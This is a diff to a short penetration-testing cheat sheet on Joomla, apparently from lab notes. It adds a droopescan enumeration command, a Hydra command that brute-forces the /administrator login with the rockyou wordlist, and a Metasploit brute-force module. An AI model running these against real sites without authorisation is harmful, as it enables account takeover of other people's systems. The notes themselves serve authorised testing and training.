@@ -3,13 +3,29 @@
 - Joomla can be enhanced with over 7,000 extensions and over 1,000 templates.
 - Joomla collects some anonymous  usage statistics such as the breakdown of Joomla, PHP and database versions and server operating systems in use on Joomla installations. This data can be queried via their public API.
 ---
+## Enumeration
+
 ```
-url -s https://developer.joomla.org/stats/cms_version | python3 -m json.tool
+droopescan scan joomla --url http://<target>
 ```
 
-`droopescan scan joomla --url http://<domainnameoripaddress>`
-Runs `droopescan` against a joomla site located at the specified url
+Fingerprints Joomla version, installed extensions, and known vulnerabilities.
+
+---
+## Brute Force
+
+**Hydra**
+
 ```
-sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
+hydra -l <user> -P /usr/share/wordlists/rockyou.txt <target> http-post-form "/administrator/index.php:username=^USER^&passwd=^PASS^&option=com_login&task=login:Invalid"
 ```
-Runs joomla-brute.py tool with python3 against a specified url, utilizing a specified wordlist (`/usr/share/metasploit-framework/data/wordlists/http_default_pass.txt`) and user or list of usernames (`-usr`)
+
+Brute force Joomla admin login via Hydra. Adjust the form fields if the target uses a custom login path.
+
+**Metasploit**
+
+```
+msf> use auxiliary/scanner/http/joomla_bruteforce_login
+```
+
+Metasploit module for Joomla login brute force.
